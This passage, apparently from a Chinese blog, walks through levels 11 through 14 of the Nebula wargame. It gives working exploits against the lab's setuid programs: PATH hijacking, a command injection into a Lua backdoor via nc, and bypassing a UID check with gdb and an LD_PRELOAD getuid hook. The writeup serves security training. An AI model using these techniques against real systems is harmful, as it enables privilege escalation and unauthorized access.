Content-Length: <span class="m">1</span>

sh: <span class="s1">$&#39;\v\020\367&#39;</span>: <span class="nb">command</span> not found
level11@nebula:/home/flag11$ ./flag11_old
Content-Length: <span class="m">1</span>

sh: <span class="s1">$&#39;\vP\241&#39;</span>: <span class="nb">command</span> not found
</pre></div>


<p>可以看到，这样对于获取到了buf的内容完全是随机的。如果我们输入一个单字符命令，比如<code>X</code>，根据<code>process()</code>中的代码，命令<code>X</code>会变为<code>Y</code>，之后进入<code>system()</code>执行。测试一下：</p>
<div class="highlight"><pre><span></span>level11@nebula:/home/flag11$ ./flag11_old
Content-Length: <span class="m">1</span>
X
sh: <span class="s1">$&#39;Y\020\321&#39;</span>: <span class="nb">command</span> not found
</pre></div>


<p>可以看到<code>X</code>命令被当做<code>Y</code>命令执行，但由于已经占用了一个字符，则没有办法输入回车。这里可以用一个拼运气的办法，不断测试，直到碰到内存中有0x0A（回车）从而获得运行：</p>
<div class="highlight"><pre><span></span>level11@nebula:/tmp$ ln -s /bin/getflag Y
level11@nebula:/tmp$ <span class="nb">export</span> <span class="nv">PATH</span><span class="o">=</span>/tmp:<span class="nv">$PATH</span>
level11@nebula:/tmp$ <span class="nb">echo</span> -ne <span class="s2">&quot;Content-Length: 1\nX&quot;</span> <span class="p">|</span> /home/flag11/flag11_old
sh: <span class="s1">$&#39;Y\240S&#39;</span>: <span class="nb">command</span> not found
level11@nebula:/tmp$ <span class="nb">echo</span> -ne <span class="s2">&quot;Content-Length: 1\nX&quot;</span> <span class="p">|</span> /home/flag11/flag11_old
sh: <span class="s1">$&#39;Y\340d&#39;</span>: <span class="nb">command</span> not found
level11@nebula:/tmp$ <span class="nb">echo</span> -ne <span class="s2">&quot;Content-Length: 1\nX&quot;</span> <span class="p">|</span> /home/flag11/flag11_old
sh: <span class="s1">$&#39;Y\200b&#39;</span>: <span class="nb">command</span> not found
level11@nebula:/tmp$ <span class="nb">echo</span> -ne <span class="s2">&quot;Content-Length: 1\nX&quot;</span> <span class="p">|</span> /home/flag11/flag11_old
You have successfully executed getflag on a target account
</pre></div>


<p>运气不错，没试几次就得到了结果:D</p>
<p>第二种方法就是走if的另外一条路，那需要满足<code>length &gt;= sizeof(buf)</code>，也就是Length&gt;=1024。可以先创建一个1024长度的空内容，之后把需要执行的命令填充进去：</p>
<div class="highlight"><pre><span></span><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp"></span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span><span class="o">*</span> <span class="n">argv</span><span class="p">[])</span> <span class="p">{</span>
    <span class="kt">int</span> <span class="n">length</span> <span class="o">=</span> <span class="mi">1024</span><span class="p">;</span>
    <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">1024</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">key</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">i</span><span class="p">;</span>

    <span class="n">memcpy</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="s">&quot;/bin/getflag&quot;</span><span class="p">,</span> <span class="mi">13</span><span class="p">);</span>

    <span class="n">key</span> <span class="o">=</span> <span class="n">length</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">;</span>
    <span class="k">for</span><span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">length</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">buffer</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^=</span> <span class="n">key</span><span class="p">;</span>
        <span class="n">key</span> <span class="o">-=</span> <span class="n">buffer</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^</span> <span class="n">key</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="n">puts</span><span class="p">(</span><span class="s">&quot;Content-Length: 1024&quot;</span><span class="p">);</span>
    <span class="n">fwrite</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">length</span><span class="p">,</span> <span class="n">stdout</span><span class="p">);</span>

    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>


<p>根据<code>getrand()</code>中的要求，设置一下环境变量：</p>
<div class="highlight"><pre><span></span><span class="nb">export</span> <span class="nv">TEMP</span><span class="o">=</span>/tmp
</pre></div>


<p>编译并执行程序：</p>
<div class="highlight"><pre><span></span><span class="n">level11</span><span class="err">@</span><span class="nl">nebula</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">gcc</span> <span class="o">-</span><span class="n">o</span> <span class="n">exp11</span> <span class="n">exp11</span><span class="p">.</span><span class="n">c</span>
<span class="n">level11</span><span class="err">@</span><span class="nl">nebula</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="p">.</span><span class="o">/</span><span class="n">exp11</span> <span class="o">|</span> <span class="o">~</span><span class="n">flag11</span><span class="o">/</span><span class="n">flag11_old</span>
<span class="n">blue</span> <span class="o">=</span> <span class="mi">1024</span><span class="p">,</span> <span class="n">length</span> <span class="o">=</span> <span class="mi">1024</span><span class="p">,</span> <span class="n">pink</span> <span class="o">=</span> <span class="mi">1024</span>
<span class="n">You</span> <span class="n">have</span> <span class="n">successfully</span> <span class="n">executed</span> <span class="n">getflag</span> <span class="n">on</span> <span class="n">a</span> <span class="n">target</span> <span class="n">account</span>
</pre></div>


<p>这样两种方法就实现了。</p>
<p>最后说一说为什么新的文件不能成功运行程序。反汇编一下flag11：</p>
<div class="highlight"><pre><span></span>   0x080489c7 &lt;+0&gt;:     push   %ebp
   0x080489c8 &lt;+1&gt;:     mov    %esp,%ebp
   0x080489ca &lt;+3&gt;:     sub    $0x28,%esp
   0x080489cd &lt;+6&gt;:     mov    0xc(%ebp),%eax
   0x080489d0 &lt;+9&gt;:     and    $0xff,%eax
   0x080489d5 &lt;+14&gt;:    mov    %eax,-0x10(%ebp)
   0x080489d8 &lt;+17&gt;:    movl   $0x0,-0xc(%ebp)
   0x080489df &lt;+24&gt;:    jmp    0x8048a0c &lt;process+69&gt;
   0x080489e1 &lt;+26&gt;:    mov    -0xc(%ebp),%eax
   0x080489e4 &lt;+29&gt;:    add    0x8(%ebp),%eax
   0x080489e7 &lt;+32&gt;:    mov    -0xc(%ebp),%edx
   0x080489ea &lt;+35&gt;:    add    0x8(%ebp),%edx
   0x080489ed &lt;+38&gt;:    movzbl (%edx),%edx
   0x080489f0 &lt;+41&gt;:    mov    %edx,%ecx
   0x080489f2 &lt;+43&gt;:    mov    -0x10(%ebp),%edx
   0x080489f5 &lt;+46&gt;:    xor    %ecx,%edx
   0x080489f7 &lt;+48&gt;:    mov    %dl,(%eax)
   0x080489f9 &lt;+50&gt;:    mov    -0xc(%ebp),%eax
   0x080489fc &lt;+53&gt;:    add    0x8(%ebp),%eax
   0x080489ff &lt;+56&gt;:    movzbl (%eax),%eax
   0x08048a02 &lt;+59&gt;:    movsbl %al,%eax
   0x08048a05 &lt;+62&gt;:    sub    %eax,-0x10(%ebp)
   0x08048a08 &lt;+65&gt;:    addl   $0x1,-0xc(%ebp)
   0x08048a0c &lt;+69&gt;:    mov    -0xc(%ebp),%eax
   0x08048a0f &lt;+72&gt;:    cmp    0xc(%ebp),%eax
   0x08048a12 &lt;+75&gt;:    jl     0x80489e1 &lt;process+26&gt;
   0x08048a14 &lt;+77&gt;:    call   0x8048700 &lt;getgid@plt&gt;
   0x08048a19 &lt;+82&gt;:    mov    %eax,(%esp)
   0x08048a1c &lt;+85&gt;:    call   0x8048690 &lt;setgid@plt&gt;
   0x08048a21 &lt;+90&gt;:    call   0x8048630 &lt;getuid@plt&gt;
   0x08048a26 &lt;+95&gt;:    mov    %eax,(%esp)
   0x08048a29 &lt;+98&gt;:    call   0x8048730 &lt;setuid@plt&gt;
   0x08048a2e &lt;+103&gt;:   mov    0x8(%ebp),%eax
   0x08048a31 &lt;+106&gt;:   mov    %eax,(%esp)
   0x08048a34 &lt;+109&gt;:   call   0x80486a0 &lt;system@plt&gt;
   0x08048a39 &lt;+114&gt;:   leave  
   0x08048a3a &lt;+115&gt;:   ret  
</pre></div>


<p>上面是flag11中<code>process()</code>完整的反汇编代码。可以看到0x08048a14开始有<code>setgid()</code>和<code>setuid()</code>的操作。这段反汇编如果翻译到C语言是这样的：</p>
<div class="highlight"><pre><span></span><span class="kt">void</span> <span class="nf">process</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">buffer</span><span class="p">,</span> <span class="kt">int</span> <span class="n">length</span><span class="p">)</span>
<span class="p">{</span>
  <span class="p">...</span>

  <span class="n">setgid</span><span class="p">(</span><span class="n">getgid</span><span class="p">());</span>
  <span class="n">setuid</span><span class="p">(</span><span class="n">getuid</span><span class="p">());</span>

  <span class="n">system</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span>
<span class="p">}</span>
</pre></div>


<p>加入这两句之后，程序在执行<code>system()</code>之前会强制还原uid和gid，因此程序本身的setuid权限失效，程序执行者永远是level11，而不是flag11，所以就不可能成功了。我这里也试验了用LD_PRELOAD的办法Hack掉<code>getuid()</code>和<code>getpid()</code>，但是很可惜方法无效，因为没有权限。</p>
<h1>Nebula level12</h1>
<blockquote>
<p>There is a backdoor process listening on port 50001.</p>
<p>50001端口有个后门进程。</p>
</blockquote>
<div class="highlight"><pre><span></span><span class="kd">local</span> <span class="n">socket</span> <span class="o">=</span> <span class="nb">require</span><span class="p">(</span><span class="s2">&quot;socket&quot;</span><span class="p">)</span>
<span class="kd">local</span> <span class="n">server</span> <span class="o">=</span> <span class="nb">assert</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">bind</span><span class="p">(</span><span class="s2">&quot;127.0.0.1&quot;</span><span class="p">,</span> <span class="mi">50001</span><span class="p">))</span>

<span class="kr">function</span> <span class="nf">hash</span><span class="p">(</span><span class="n">password</span><span class="p">)</span> 
  <span class="n">prog</span> <span class="o">=</span> <span class="nb">io.popen</span><span class="p">(</span><span class="s2">&quot;echo &quot;</span><span class="o">..</span><span class="n">password</span><span class="o">..</span><span class="s2">&quot; | sha1sum&quot;</span><span class="p">,</span> <span class="s2">&quot;r&quot;</span><span class="p">)</span>
  <span class="n">data</span> <span class="o">=</span> <span class="n">prog</span><span class="p">:</span><span class="n">read</span><span class="p">(</span><span class="s2">&quot;*all&quot;</span><span class="p">)</span>
  <span class="n">prog</span><span class="p">:</span><span class="n">close</span><span class="p">()</span>

  <span class="n">data</span> <span class="o">=</span> <span class="nb">string.sub</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">40</span><span class="p">)</span>

  <span class="kr">return</span> <span class="n">data</span>
<span class="kr">end</span>


<span class="kr">while</span> <span class="mi">1</span> <span class="kr">do</span>
  <span class="kd">local</span> <span class="n">client</span> <span class="o">=</span> <span class="n">server</span><span class="p">:</span><span class="n">accept</span><span class="p">()</span>
  <span class="n">client</span><span class="p">:</span><span class="n">send</span><span class="p">(</span><span class="s2">&quot;Password: &quot;</span><span class="p">)</span>
  <span class="n">client</span><span class="p">:</span><span class="n">settimeout</span><span class="p">(</span><span class="mi">60</span><span class="p">)</span>
  <span class="kd">local</span> <span class="n">line</span><span class="p">,</span> <span class="n">err</span> <span class="o">=</span> <span class="n">client</span><span class="p">:</span><span class="n">receive</span><span class="p">()</span>
  <span class="kr">if</span> <span class="ow">not</span> <span class="n">err</span> <span class="kr">then</span>
    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;trying &quot;</span> <span class="o">..</span> <span class="n">line</span><span class="p">)</span> <span class="c1">-- log from where ;\</span>
    <span class="kd">local</span> <span class="n">h</span> <span class="o">=</span> <span class="n">hash</span><span class="p">(</span><span class="n">line</span><span class="p">)</span>

    <span class="kr">if</span> <span class="n">h</span> <span class="o">~=</span> <span class="s2">&quot;4754a4f4bd5787accd33de887b9250a0691dd198&quot;</span> <span class="kr">then</span>
      <span class="n">client</span><span class="p">:</span><span class="n">send</span><span class="p">(</span><span class="s2">&quot;Better luck next time</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">);</span>
    <span class="kr">else</span>
      <span class="n">client</span><span class="p">:</span><span class="n">send</span><span class="p">(</span><span class="s2">&quot;Congrats, your token is 413**CARRIER LOST**</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
    <span class="kr">end</span>

  <span class="kr">end</span>

  <span class="n">client</span><span class="p">:</span><span class="n">close</span><span class="p">()</span>
<span class="kr">end</span>
</pre></div>


<p>一段Lua脚本，逻辑简单清晰。脚本语言的好处就是你不懂语法，也能猜出个大概。</p>
<p>这段脚本监听50001端口，并需要连接后提交密码。显然我们最关心的是能不能运行shell脚本，因此定位到<code>hash()</code>中的<code>popen()</code>。</p>
<p>直接截断看看可不可以：</p>
<div class="highlight"><pre><span></span>level12@nebula:~$ nc <span class="m">127</span>.0.0.1 <span class="m">50001</span>
Password: <span class="p">;</span>/bin/getflag &gt; /tmp/flag12.txt
Better luck next <span class="nb">time</span>
level12@nebula:~$ cat /tmp/flag12.txt 
You have successfully executed getflag on a target account
</pre></div>


<p>得来全不费工夫！</p>
<h1>Nebula level13</h1>
<blockquote>
<p>There is a security check that prevents the program from continuing execution if the user invoking it does not match a specific user id.</p>
<p>这是一个具有安全验证的程序，可以阻止非指定用户的执行。</p>
</blockquote>
<div class="highlight"><pre><span></span><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;sys/types.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp"></span>

<span class="cp">#define FAKEUID 1000</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
<span class="p">{</span>
  <span class="kt">int</span> <span class="n">c</span><span class="p">;</span>
  <span class="kt">char</span> <span class="n">token</span><span class="p">[</span><span class="mi">256</span><span class="p">];</span>

  <span class="k">if</span><span class="p">(</span><span class="n">getuid</span><span class="p">()</span> <span class="o">!=</span> <span class="n">FAKEUID</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Security failure detected. UID %d started us, we expect %d</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">getuid</span><span class="p">(),</span> <span class="n">FAKEUID</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;The system administrators will be notified of this violation</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
    <span class="n">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span>
  <span class="p">}</span>

  <span class="c1">// snip, sorry :)</span>

  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;your token is %s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">token</span><span class="p">);</span>

<span class="p">}</span>
</pre></div>


<p>程序在运行时会检测用户的UID是否为1000（通过<code>cat /etc/passwd | grep 1000</code>发现uid=1000的用户为nebula）。</p>
<p>这里可以想办法通过干预getuid()的返回值来得到目的，因此可以采用GDB对返回值作出修改：</p>
<div class="highlight"><pre><span></span>gdb ./flag13
...
<span class="o">(</span>gdb<span class="o">)</span> disas main
</pre></div>


<p>反汇编main函数后发现：</p>
<div class="highlight"><pre><span></span>Dump of assembler code for function main:
...
   0x080484ef &lt;+43&gt;:    call   0x80483c0 &lt;getuid@plt&gt;
   0x080484f4 &lt;+48&gt;:    cmp    $0x3e8,%eax
...
---Type &lt;return&gt; to continue, or q &lt;return&gt; to quit---q
</pre></div>


<p>可以看到，此处调用getuid()之后会把返回值放到eax中，因此只要在<code>0x080484f4</code>处下断，让程序跑起来后修改eax为1000即可：</p>
<div class="highlight"><pre><span></span>(gdb) b *0x080484f4
Breakpoint 1 at 0x80484f4
(gdb) r
Starting program: /home/flag13/flag13 

Breakpoint 1, 0x080484f4 in main ()
(gdb) p $eax
$1 = 1014
(gdb) set $eax=1000
(gdb) p $eax
$2 = 1000
(gdb) c
Continuing.
your token is b705702b-76a8-42b0-8844-3adabbe5ac58
[Inferior 1 (process 15690) exited with code 063]
</pre></div>


<p>得到密码<code>b705702b-76a8-42b0-8844-3adabbe5ac58</code>。</p>
<p>当然此题还有一种解法，就是劫持getuid()函数。</p>
<p>首先通过<code>file</code>发现flag13调用了共享库，接着创建一个C文件：</p>
<div class="highlight"><pre><span></span><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;sys/types.h&gt;</span><span class="cp"></span>

<span class="kt">uid_t</span> <span class="nf">getuid</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">return</span> <span class="mi">1000</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>


<p>之后编译并通过LD_PRELOAD环境变量替换掉真实的getuid()函数：</p>
<div class="highlight"><pre><span></span>gcc -fPIC -shared -o preload.so preload.c
<span class="nb">export</span> <span class="nv">LD_PRELOAD</span><span class="o">=</span>/home/level13/preload.so
</pre></div>


<p>之后通过strace来调用，即可观察到结果：</p>
<div class="highlight"><pre><span></span>level13@nebula:~$ strace /home/flag13/flag13
...
write<span class="o">(</span><span class="m">1</span>, <span class="s2">&quot;your token is b705702b-76a8-42b0&quot;</span>..., 51your token is b705702b-76a8-42b0-8844-3adabbe5ac58
<span class="o">)</span> <span class="o">=</span> <span class="m">51</span>
...
</pre></div>


<h1>Nebula level14</h1>
<blockquote>
<p>This program resides in /home/flag14/flag14 . It encrypts input and writes it to standard output. An encrypted token file is also in that home directory, decrypt it :)</p>
<p>程序加密了输入并写入标准输出，加密的token文件和程序都在flag14的家目录中。</p>
</blockquote>
<p>这题非常简单，破解加密算法，本来以为需要逆向，由于规律实在太简单，实验了几次就出来了：</p>
<div class="highlight"><pre><span></span>level14@nebula:/home/flag14$ ./flag14
./flag14
    -e  Encrypt input
level14@nebula:/home/flag14$ ./flag14 -e
<span class="m">123456</span>
<span class="m">13579</span><span class="p">;</span>
level14@nebula:/home/flag14$ ./flag14 -e
<span class="m">654321</span>
<span class="m">666666</span>
level14@nebula:/home/flag14$ ./flag14 -e
<span class="m">11111111111111111111111111</span>
<span class="m">123456789</span>:<span class="p">;</span>&lt;<span class="o">=</span>&gt;?@ABCDEFGHIJ$^C
</pre></div>


<p>可以看到，如果把输入数据看成一个数组，加密数据相当于输入数据加上数据的下标（从0开始），于是写出算法：</p>
<div class="highlight"><pre><span></span><span class="n">plain</span> <span class="o">=</span> <span class="s1">&#39;123456&#39;</span>
<span class="n">encrypt</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">plain</span><span class="p">)):</span>
    <span class="n">encrypt</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">plain</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="p">])</span> <span class="o">+</span> <span class="n">i</span><span class="p">)</span>

<span class="k">print</span> <span class="n">encrypt</span>
</pre></div>


<p>因此可以写出逆运算并把token文件给解密：</p>
<div class="highlight"><pre><span></span><span class="n">token</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;/home/flag14/token&#39;</span><span class="p">)</span>
<span class="n">encrypt</span> <span class="o">=</span> <span class="n">token</span><span class="o">.</span><span class="n">read</span><span class="p">()[:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
<span class="n">plain</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">encrypt</span><span class="p">)):</span>
   <span class="n">plain</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">encrypt</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="p">])</span> <span class="o">-</span> <span class="n">i</span><span class="p">)</span>

<span class="k">print</span> <span class="n">plain</span>
</pre></div>


<p>最后得到token：8457c118-887c-4e40-a5a6-33a25353165。</p>
        </section>

        <br><br><br>

        <footer>
          <!-- <div class="adjust-width">
            <div id="author-block" class="w3-light-grey w3-border">
              <div id="author-info">
                <a href=""><img style="width: 60px; height: 60px;" src="/theme/images/cat_avatar.png" onerror="this.src='theme/images/avatar.png'" alt="Avatar"></a>
                <div style="margin-left: 20px; margin-top: 15px;">
                  <a href=""><span id="author-name" class="w3-hover-text-dark-grey">YYX</span></a>
                  <p id="author-story"></p>
                </div>
              </div>
            </div>
          </div>

          <br><br><br> -->

          <p style="font-size:10pt; font-style: italic;">Did you like this article? Share it with your friends!</p>
          <div id="share" class="share">
            <a href="http://www.facebook.com/sharer.php?u=http%3A//blog.yyx.me/posts/exploit-exercises-nebula-level-10-14.html&amp;t=YYX%27s%20WEBlog%3A%20Exploit%20Exercises%20Nebula%20level10-14%20Writeup" target="_blank" class="w3-btn yyx-btn-hover">
              <i class="fa fa-facebook"></i> <!-- <span>Facebook</span> -->
            </a>
            <a href="http://twitter.com/share?url=http%3A//blog.yyx.me/posts/exploit-exercises-nebula-level-10-14.html&amp;text=YYX%27s%20WEBlog%3A%20Exploit%20Exercises%20Nebula%20level10-14%20Writeup" target="_blank" class="w3-btn yyx-btn-hover">
              <i class="fa fa-twitter"></i> <!-- <span>Twitter</span> -->
            </a>
            <a href="https://plus.google.com/share?url=http%3A//blog.yyx.me/posts/exploit-exercises-nebula-level-10-14.html" onclick="javascript:window.open(this.href, '', 'menubar=no,toolbar=no,resizable=yes,scrollbars=yes,height=600,width=600');return false;" class="w3-btn yyx-btn-hover">
              <i class="fa fa-google-plus"></i> <!-- <span>Google</span> -->
            </a>
          </div>

          <br><br><br>


<div id="disqus_thread"></div>
<script>
    /**
     *  RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT 
     *  THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR 
     *  PLATFORM OR CMS.
     *  
     *  LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: 
     *  https://disqus.com/admin/universalcode/#configuration-variables
     */
    /*
    var disqus_config = function () {
        // Replace PAGE_URL with your page's canonical URL variable
        this.page.url = PAGE_URL;  
        
        // Replace PAGE_IDENTIFIER with your page's unique identifier variable
        this.page.identifier = PAGE_IDENTIFIER; 
    };
    */
    
    (function() {  // REQUIRED CONFIGURATION VARIABLE: EDIT THE SHORTNAME BELOW
        var d = document, s = d.createElement('script');
        
        // IMPORTANT: Replace EXAMPLE with your forum shortname!
        s.src = 'https://yyxblog.disqus.com/embed.js';
        
        s.setAttribute('data-timestamp', +new Date());
        (d.head || d.body).appendChild(s);
    })();
</script>
<noscript>
    Please enable JavaScript to view the 
    <a href="https://disqus.com/?ref_noscript" rel="nofollow">
        comments powered by Disqus.
    </a>
</noscript>
          <br><br><br>

        </footer>
      </div>
    </article>


    <footer id="footer">
      <div id="footer-copyright" class="w3-center w3-text-grey w3-padding-48">
        <span>
          &copy;
          2014&dash;2017          YYX
 | <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" target="_blank"><i class="fa fa-creative-commons" aria-hidden="true"></i></a>        </span>
      </div>
    </footer>

    <!-- Google Analytics -->
    <script>
      (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
      (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
      m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
      })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
      ga('create', 'UA-64342434-1', 'auto');
      ga('send', 'pageview');
    </script>

  </body>
</html>